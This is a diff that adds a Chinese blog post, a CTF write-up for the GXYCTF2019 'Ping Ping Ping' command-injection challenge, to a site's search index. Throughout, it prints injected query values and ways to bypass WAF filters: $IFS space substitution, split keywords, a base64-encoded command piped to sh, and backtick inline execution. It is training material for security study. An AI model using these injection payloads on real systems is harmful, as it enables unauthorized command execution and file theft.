@@ -250,4 +250,44 @@ printf(serialize($c));
         <tag>随笔</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ping</title>
+    <url>/2022/01/05/ping/</url>
+    <content><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping-命令注入"><a href="#GXYCTF2019-Ping-Ping-Ping-命令注入" class="headerlink" title="[[GXYCTF2019]Ping Ping Ping]命令注入"></a>[[GXYCTF2019]Ping Ping Ping]命令注入</h1><p>1.管道符</p>
+<p>； |  &amp;  常用</p>
+<p>2.绕过</p>
+<p>绕过空格</p>
+<p>$IFS$9  &lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, I F S , {IFS},IFS,IFS</p>
+<p>3.过滤单词</p>
+<p>变量替换 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php </span><br></pre></td></tr></table></figure>
+
+<p>过滤bash用sh执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  </span><br><span class="line">//Y2F0IGZsYWcucGhw -&gt;cat flag.php,输出给base64还原然后sh执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>内联执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">//内联，就是将反引号内命令的输出作为输入执行。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>4.关键字过滤</p>
+<h5 id="方法一：特殊变量"><a href="#方法一：特殊变量" class="headerlink" title="方法一：特殊变量"></a>方法一：特殊变量</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$*</span><br><span class="line">$@</span><br><span class="line">$x    (x 代表 1-9)</span><br><span class="line">$&#123;x&#125;   (x&gt;=10)</span><br><span class="line">在没有传参的情况下，上面的特殊变量都是为空的 ca$&#123;21&#125;t a.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="方法二：反斜杠"><a href="#方法二：反斜杠" class="headerlink" title="方法二：反斜杠"></a>方法二：反斜杠</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca\t a.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法三：变量替换"><a href="#方法三：变量替换" class="headerlink" title="方法三：变量替换"></a>方法三：变量替换</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=ca;b=t;c=a.txt;aaab $c</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法四：引号"><a href="#方法四：引号" class="headerlink" title="方法四：引号"></a>方法四：引号</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&#x27;a&#x27;t flag.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">3.|</span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">4.||</span><br><span class="line">只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">5.；</span><br><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>更多详情，查看以下文章</p>
+<p>参考文章：[<a href="https://www.cnblogs.com/HelloCTF/p/13051220.html">GXYCTF2019]Ping Ping Ping(ping命令执行绕过Waf) - Hel10 - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://blog.csdn.net/qq_45655564/article/details/117395152">(41条消息) 命令注入————ctfhub（过滤cat、空格、目录分隔符、运算符、综合过滤练习）_小Low娃的博客-CSDN博客_ctfhub 命令注入 综合过滤</a></p>
+]]></content>
+      <categories>
+        <category>ping</category>
+      </categories>
+      <tags>
+        <tag>ping</tag>
+      </tags>
+  </entry>
 </search>
